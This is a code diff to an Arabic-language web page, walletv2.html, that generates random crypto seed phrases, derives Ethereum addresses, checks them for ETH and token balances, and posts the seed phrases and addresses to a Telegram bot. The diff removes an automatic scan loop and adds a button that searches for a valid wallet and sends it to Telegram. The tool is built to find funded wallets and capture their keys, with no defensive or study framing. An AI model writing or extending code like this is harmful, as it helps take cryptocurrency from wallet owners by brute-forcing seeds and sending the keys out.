@@ -1,3 +1,6 @@
+[file name]: walletv2.html
+[file content begin]
+10
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -165,6 +168,16 @@
             box-shadow: 0 10px 20px rgba(255, 154, 0, 0.3);
         }
 
+        .btn-info {
+            background: linear-gradient(135deg, #17a2b8 0%, #6f42c1 100%);
+            color: white;
+        }
+
+        .btn-info:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(23, 162, 184, 0.3);
+        }
+
         .btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
@@ -267,6 +280,10 @@
 
         .log-info {
             color: #17a2b8;
+        }
+
+        .log-warning {
+            color: #ffc107;
         }
 
         .wallet-display {
@@ -514,6 +531,22 @@
         .token-item:last-child {
             border-bottom: none;
         }
+
+        .valid-wallet {
+            background: #e8f5e8;
+            border-left: 5px solid #28a745;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .invalid-wallet {
+            background: #f8d7da;
+            border-left: 5px solid #dc3545;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
     </style>
 </head>
 <body>
@@ -562,56 +595,12 @@
                     <button id="testManualBtn" class="btn btn-warning">
                         <span>🔍 فحص العبارة</span>
                     </button>
+                    <button id="generateValidWalletBtn" class="btn btn-info">
+                        <span>🔄 توليد محفظة صالحة</span>
+                    </button>
                 </div>
                 <div id="manualTestResult" class="test-result" style="display: none;">
                     <!-- سيتم ملؤه ديناميكيًا -->
-                </div>
-            </div>
-
-            <!-- قسم الفحص التلقائي للعبارات -->
-            <div class="control-panel">
-                <h3>🤖 الفحص التلقائي للعبارات النشطة والفارغة</h3>
-                <div class="control-group">
-                    <label for="autoTestSpeed">سرعة الفحص التلقائي (مللي ثانية):</label>
-                    <input type="number" id="autoTestSpeed" value="2000" min="500" max="10000" step="500">
-                </div>
-                <div class="control-group">
-                    <label for="autoTestLimit">عدد العبارات المطلوب فحصها (0 = لا نهاية):</label>
-                    <input type="number" id="autoTestLimit" value="10" min="0" max="1000">
-                </div>
-                <div class="control-group">
-                    <label for="testType">نوع الفحص:</label>
-                    <select id="testType">
-                        <option value="all">جميع العبارات (النشطة والفارغة)</option>
-                        <option value="active">العبارات النشطة فقط</option>
-                        <option value="empty">العبارات الفارغة فقط</option>
-                    </select>
-                </div>
-                <div class="button-group">
-                    <button id="startAutoTestBtn" class="btn btn-success">
-                        <span>🤖 بدء الفحص التلقائي</span>
-                    </button>
-                    <button id="stopAutoTestBtn" class="btn btn-danger" disabled>
-                        <span>⏹️ إيقاف الفحص</span>
-                    </button>
-                </div>
-                <div class="status-grid">
-                    <div class="status-card">
-                        <div class="number" id="autoTestTotal">0</div>
-                        <div class="label">إجمالي العبارات المفحوصة</div>
-                    </div>
-                    <div class="status-card">
-                        <div class="number" id="autoTestValid">0</div>
-                        <div class="label">العبارات الصالحة</div>
-                    </div>
-                    <div class="status-card">
-                        <div class="number" id="autoTestActive">0</div>
-                        <div class="label">العبارات النشطة</div>
-                    </div>
-                    <div class="status-card">
-                        <div class="number" id="autoTestEmpty">0</div>
-                        <div class="label">العبارات الفارغة</div>
-                    </div>
                 </div>
             </div>
 
@@ -629,6 +618,10 @@
                     <div class="status-card">
                         <div class="number" id="emptyWallets">0</div>
                         <div class="label">المحافظ الفارغة</div>
+                    </div>
+                    <div class="status-card">
+                        <div class="number" id="validWallets">0</div>
+                        <div class="label">المحافظ الصالحة</div>
                     </div>
                     <div class="status-card">
                         <div class="number" id="errorCount">0</div>
@@ -932,17 +925,8 @@
             totalGenerated: 0,
             activeWallets: 0,
             emptyWallets: 0,
+            validWallets: 0,
             errors: 0
-        };
-
-        // متغيرات الفحص التلقائي
-        let isAutoTestRunning = false;
-        let autoTestInterval = null;
-        let autoTestStats = {
-            total: 0,
-            valid: 0,
-            active: 0,
-            empty: 0
         };
 
         // عناصر DOM
@@ -952,6 +936,7 @@
             testTelegramBtn: document.getElementById('testTelegramBtn'),
             clearLogsBtn: document.getElementById('clearLogsBtn'),
             testManualBtn: document.getElementById('testManualBtn'),
+            generateValidWalletBtn: document.getElementById('generateValidWalletBtn'),
             manualMnemonic: document.getElementById('manualMnemonic'),
             manualTestResult: document.getElementById('manualTestResult'),
             searchSpeed: document.getElementById('searchSpeed'),
@@ -959,20 +944,12 @@
             totalGenerated: document.getElementById('totalGenerated'),
             activeWallets: document.getElementById('activeWallets'),
             emptyWallets: document.getElementById('emptyWallets'),
+            validWallets: document.getElementById('validWallets'),
             errorCount: document.getElementById('errorCount'),
             progressFill: document.getElementById('progressFill'),
             currentStatus: document.getElementById('currentStatus'),
             logPanel: document.getElementById('logPanel'),
-            currentTime: document.getElementById('currentTime'),
-            startAutoTestBtn: document.getElementById('startAutoTestBtn'),
-            stopAutoTestBtn: document.getElementById('stopAutoTestBtn'),
-            autoTestSpeed: document.getElementById('autoTestSpeed'),
-            autoTestLimit: document.getElementById('autoTestLimit'),
-            testType: document.getElementById('testType'),
-            autoTestTotal: document.getElementById('autoTestTotal'),
-            autoTestValid: document.getElementById('autoTestValid'),
-            autoTestActive: document.getElementById('autoTestActive'),
-            autoTestEmpty: document.getElementById('autoTestEmpty')
+            currentTime: document.getElementById('currentTime')
         };
 
         // تحديث الوقت الحالي
@@ -1208,12 +1185,44 @@
             return message;
         }
 
+        // دالة جديدة لإرسال محفظة صالحة إلى Telegram
+        function formatValidWalletMessage(mnemonic, address) {
+            const timestamp = new Date().toLocaleString('ar-EG', {
+                timeZone: 'Africa/Cairo',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            let message = `✅ <b>تم العثور على محفظة صالحة</b>\n\n`;
+            message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
+            message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
+            message += `💡 <b>ملاحظة:</b> هذه محفظة صالحة ولكنها فارغة\n\n`;
+            message += `⏰ <b>الوقت:</b> ${timestamp}`;
+            
+            return message;
+        }
+
         async function sendWalletToTelegram(mnemonic, address, walletDetails, isActive) {
             try {
                 const message = formatWalletMessage(mnemonic, address, walletDetails, isActive);
                 return await sendTelegramMessage(message);
             } catch (error) {
                 console.error('خطأ في إرسال المحفظة:', error);
+                return false;
+            }
+        }
+
+        // دالة جديدة لإرسال محفظة صالحة إلى Telegram
+        async function sendValidWalletToTelegram(mnemonic, address) {
+            try {
+                const message = formatValidWalletMessage(mnemonic, address);
+                return await sendTelegramMessage(message);
+            } catch (error) {
+                console.error('خطأ في إرسال المحفظة الصالحة:', error);
                 return false;
             }
         }
@@ -1234,6 +1243,7 @@
             elements.totalGenerated.textContent = stats.totalGenerated;
             elements.activeWallets.textContent = stats.activeWallets;
             elements.emptyWallets.textContent = stats.emptyWallets;
+            elements.validWallets.textContent = stats.validWallets;
             elements.errorCount.textContent = stats.errors;
             
             const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
@@ -1241,13 +1251,6 @@
                 const progress = (stats.totalGenerated / maxAttempts) * 100;
                 elements.progressFill.style.width = `${Math.min(progress, 100)}%`;
             }
-        }
-
-        function updateAutoTestStats() {
-            elements.autoTestTotal.textContent = autoTestStats.total;
-            elements.autoTestValid.textContent = autoTestStats.valid;
-            elements.autoTestActive.textContent = autoTestStats.active;
-            elements.autoTestEmpty.textContent = autoTestStats.empty;
         }
 
         function updateStatus(message, type = 'info') {
@@ -1382,6 +1385,89 @@
             }
         }
 
+        // دالة جديدة لتوليد وفحص محفظة صالحة
+        async function generateAndTestValidWallet() {
+            try {
+                if (!checkEthersLoaded()) {
+                    return;
+                }
+
+                updateStatus('جاري توليد وفحص محفظة صالحة...', 'info');
+                addLogEntry('🔄 جاري توليد وفحص محفظة صالحة...');
+                
+                elements.generateValidWalletBtn.innerHTML = '<span class="loading-spinner"></span> جاري البحث...';
+                elements.generateValidWalletBtn.disabled = true;
+                
+                let attempts = 0;
+                const maxAttempts = 50; // حد أقصى للمحاولات لتجنب الحلقات اللانهائية
+                
+                while (attempts < maxAttempts) {
+                    attempts++;
+                    
+                    try {
+                        const mnemonic = generateRandomBIP39Phrase();
+                        
+                        // التحقق من صحة العبارة باستخدام ethers.js
+                        if (ethers.utils.isValidMnemonic(mnemonic)) {
+                            const address = await mnemonicToAddress(mnemonic);
+                            
+                            if (address) {
+                                // فحص المحفظة
+                                const walletStatus = await isWalletActive(address);
+                                
+                                // إذا كانت المحفظة صالحة (حتى لو فارغة)
+                                stats.validWallets++;
+                                updateStats();
+                                
+                                addLogEntry(`✅ تم العثور على محفظة صالحة! العنوان: ${address}`, 'success');
+                                
+                                // إرسال إلى Telegram
+                                const telegramSent = await sendValidWalletToTelegram(mnemonic, address);
+                                
+                                if (telegramSent) {
+                                    addLogEntry('✅ تم إرسال المحفظة الصالحة إلى Telegram بنجاح', 'success');
+                                    updateStatus('✅ تم العثور على محفظة صالحة وإرسالها إلى Telegram', 'success');
+                                } else {
+                                    addLogEntry('❌ فشل في إرسال المحفظة الصالحة إلى Telegram', 'error');
+                                    updateStatus('✅ تم العثور على محفظة صالحة ولكن فشل الإرسال إلى Telegram', 'warning');
+                                }
+                                
+                                // عرض النتيجة في الواجهة
+                                updateManualTestResult(mnemonic, address, walletStatus);
+                                
+                                // ملء حقل العبارة اليدوية بالمحفظة التي تم العثور عليها
+                                elements.manualMnemonic.value = mnemonic;
+                                
+                                break;
+                            }
+                        }
+                    } catch (error) {
+                        // تجاهل الأخطاء والمتابعة في المحاولة التالية
+                        console.log(`محاولة ${attempts} فشلت: ${error.message}`);
+                    }
+                    
+                    // إضافة سجل كل 10 محاولات
+                    if (attempts % 10 === 0) {
+                        addLogEntry(`🔍 لا زال البحث جارياً... المحاولة ${attempts}`);
+                    }
+                }
+                
+                if (attempts >= maxAttempts) {
+                    updateStatus('❌ لم يتم العثور على محفظة صالحة بعد الحد الأقصى للمحاولات', 'warning');
+                    addLogEntry('❌ لم يتم العثور على محفظة صالحة بعد 50 محاولة', 'warning');
+                }
+                
+                elements.generateValidWalletBtn.innerHTML = '<span>🔄 توليد محفظة صالحة</span>';
+                elements.generateValidWalletBtn.disabled = false;
+                
+            } catch (error) {
+                updateStatus(`❌ خطأ في توليد المحفظة الصالحة: ${error.message}`, 'danger');
+                addLogEntry(`❌ خطأ في توليد المحفظة الصالحة: ${error.message}`, 'error');
+                elements.generateValidWalletBtn.innerHTML = '<span>🔄 توليد محفظة صالحة</span>';
+                elements.generateValidWalletBtn.disabled = false;
+            }
+        }
+
         // تحديث دالة عرض النتائج اليدوية
         function updateManualTestResult(mnemonic, address, walletStatus) {
             let resultHTML = '';
@@ -1458,163 +1544,6 @@
             elements.manualTestResult.style.display = 'block';
         }
 
-        // وظائف الفحص التلقائي للعبارات
-        async function autoTestMnemonics() {
-            try {
-                if (!checkEthersLoaded()) {
-                    return;
-                }
-
-                const mnemonic = generateRandomBIP39Phrase();
-                autoTestStats.total++;
-                
-                addLogEntry(`🤖 فحص تلقائي - عبارة ${autoTestStats.total}: ${mnemonic.substring(0, 30)}...`);
-                
-                let address;
-                try {
-                    address = await mnemonicToAddress(mnemonic);
-                } catch (error) {
-                    addLogEntry(`❌ عبارة غير صالحة: ${error.message}`, 'error');
-                    updateAutoTestStats();
-                    return;
-                }
-                
-                autoTestStats.valid++;
-                addLogEntry(`✅ عبارة صالحة - العنوان: ${address.substring(0, 20)}...`);
-                
-                const walletStatus = await isWalletActive(address);
-                
-                const testType = elements.testType.value;
-                let shouldSend = false;
-                
-                if (testType === 'all') {
-                    shouldSend = true;
-                } else if (testType === 'active' && walletStatus.isActive) {
-                    shouldSend = true;
-                } else if (testType === 'empty' && !walletStatus.isActive) {
-                    shouldSend = true;
-                }
-                
-                if (shouldSend) {
-                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
-                    
-                    if (walletStatus.isActive) {
-                        autoTestStats.active++;
-                        addLogEntry(`🎉 محفظة نشطة تم إرسالها إلى Telegram`, 'success');
-                        
-                        if (telegramSent) {
-                            addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
-                        } else {
-                            addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
-                        }
-                    } else {
-                        autoTestStats.empty++;
-                        addLogEntry(`📭 محفظة فارغة تم إرسالها إلى Telegram`, 'info');
-                        
-                        if (telegramSent) {
-                            addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
-                        } else {
-                            addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
-                        }
-                    }
-                } else {
-                    if (walletStatus.isActive) {
-                        autoTestStats.active++;
-                        addLogEntry(`⚠️ محفظة نشطة (لم يتم إرسالها حسب الإعدادات)`, 'info');
-                    } else {
-                        autoTestStats.empty++;
-                        addLogEntry(`⚠️ محفظة فارغة (لم يتم إرسالها حسب الإعدادات)`, 'info');
-                    }
-                }
-                
-                updateAutoTestStats();
-                
-                const testLimit = parseInt(elements.autoTestLimit.value) || 0;
-                if (testLimit > 0 && autoTestStats.total >= testLimit) {
-                    stopAutoTest();
-                    updateStatus(`تم الوصول للحد الأقصى للفحص التلقائي (${testLimit})`, 'warning');
-                    addLogEntry(`تم إيقاف الفحص التلقائي - وصل للحد الأقصى: ${testLimit} عبارة`, 'info');
-                    
-                    // إرسال ملخص النتائج إلى Telegram
-                    const summaryMessage = `📊 <b>ملخص الفحص التلقائي</b>\n\n` +
-                        `🔢 إجمالي العبارات المفحوصة: ${autoTestStats.total}\n` +
-                        `✅ العبارات الصالحة: ${autoTestStats.valid}\n` +
-                        `🎉 المحافظ النشطة: ${autoTestStats.active}\n` +
-                        `📭 المحافظ الفارغة: ${autoTestStats.empty}\n\n` +
-                        `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
-                    
-                    await sendTelegramMessage(summaryMessage);
-                }
-                
-            } catch (error) {
-                addLogEntry(`❌ خطأ في الفحص التلقائي: ${error.message}`, 'error');
-                updateAutoTestStats();
-            }
-        }
-
-        async function startAutoTest() {
-            if (isAutoTestRunning) return;
-            
-            if (!checkEthersLoaded()) {
-                return;
-            }
-            
-            isAutoTestRunning = true;
-            elements.startAutoTestBtn.disabled = true;
-            elements.stopAutoTestBtn.disabled = false;
-            
-            // إعادة تعيين الإحصائيات
-            autoTestStats = {
-                total: 0,
-                valid: 0,
-                active: 0,
-                empty: 0
-            };
-            updateAutoTestStats();
-            
-            const speed = parseInt(elements.autoTestSpeed.value) || 2000;
-            const testType = elements.testType.value;
-            
-            updateStatus('جاري بدء الفحص التلقائي...', 'info');
-            addLogEntry(`🤖 تم بدء الفحص التلقائي (النوع: ${testType === 'all' ? 'الكل' : testType === 'active' ? 'النشطة فقط' : 'الفارغة فقط'})`);
-            
-            const startMessage = `🤖 <b>بدء الفحص التلقائي للعبارات</b>\n\n` +
-                `📊 نوع الفحص: ${testType === 'all' ? 'جميع العبارات' : testType === 'active' ? 'العبارات النشطة فقط' : 'العبارات الفارغة فقط'}\n` +
-                `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n` +
-                `🔍 جاري فحص العبارات وإرسال النتائج إلى Telegram...`;
-            
-            await sendTelegramMessage(startMessage);
-            
-            autoTestInterval = setInterval(autoTestMnemonics, speed);
-        }
-
-        async function stopAutoTest() {
-            if (!isAutoTestRunning) return;
-            
-            isAutoTestRunning = false;
-            elements.startAutoTestBtn.disabled = false;
-            elements.stopAutoTestBtn.disabled = true;
-            
-            if (autoTestInterval) {
-                clearInterval(autoTestInterval);
-                autoTestInterval = null;
-            }
-            
-            updateStatus('تم إيقاف الفحص التلقائي', 'warning');
-            addLogEntry('⏹️ تم إيقاف الفحص التلقائي');
-            
-            // إرسال ملخص النتائج إلى Telegram
-            const summaryMessage = `⏹️ <b>تم إيقاف الفحص التلقائي</b>\n\n` +
-                `📊 <b>النتائج النهائية:</b>\n` +
-                `🔢 إجمالي العبارات المفحوصة: ${autoTestStats.total}\n` +
-                `✅ العبارات الصالحة: ${autoTestStats.valid}\n` +
-                `🎉 المحافظ النشطة: ${autoTestStats.active}\n` +
-                `📭 المحافظ الفارغة: ${autoTestStats.empty}\n\n` +
-                `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
-            
-            await sendTelegramMessage(summaryMessage);
-        }
-
         // وظائف التحكم
         async function startSearch() {
             if (isRunning) return;
@@ -1658,6 +1587,7 @@
             stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
             stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
             stopMessage += `❌ المحافظ الفارغة: ${stats.emptyWallets}\n`;
+            stopMessage += `🔄 المحافظ الصالحة: ${stats.validWallets}\n`;
             stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
             
             await sendTelegramMessage(stopMessage);
@@ -1690,8 +1620,7 @@
         elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
         elements.clearLogsBtn.addEventListener('click', clearLogs);
         elements.testManualBtn.addEventListener('click', testManualMnemonic);
-        elements.startAutoTestBtn.addEventListener('click', startAutoTest);
-        elements.stopAutoTestBtn.addEventListener('click', stopAutoTest);
+        elements.generateValidWalletBtn.addEventListener('click', generateAndTestValidWallet);
 
         // التحقق من تحميل ethers.js عند بدء التطبيق
         document.addEventListener('DOMContentLoaded', function() {
@@ -1699,13 +1628,13 @@
                 updateStatus('✅ تم تحميل مكتبة ethers.js بنجاح. جاهز للبدء...', 'success');
                 addLogEntry('✅ تم تحميل مكتبة ethers.js بنجاح', 'success');
                 addLogEntry('🪙 التطبيق يدعم الآن جميع العملات: ETH, USDT, USDC, DAI, LINK, UNI, WBTC, AAVE, SHIB', 'success');
-                addLogEntry('🤖 تم إضافة نظام الفحص التلقائي للعبارات النشطة والفارغة', 'success');
+                addLogEntry('🔄 تم إضافة خاصية توليد المحافظ الصالحة تلقائياً', 'info');
             }
         });
 
         // تحديث الإحصائيات عند بدء التطبيق
         updateStats();
-        updateAutoTestStats();
     </script>
 </body>
 </html>
+[file content end]
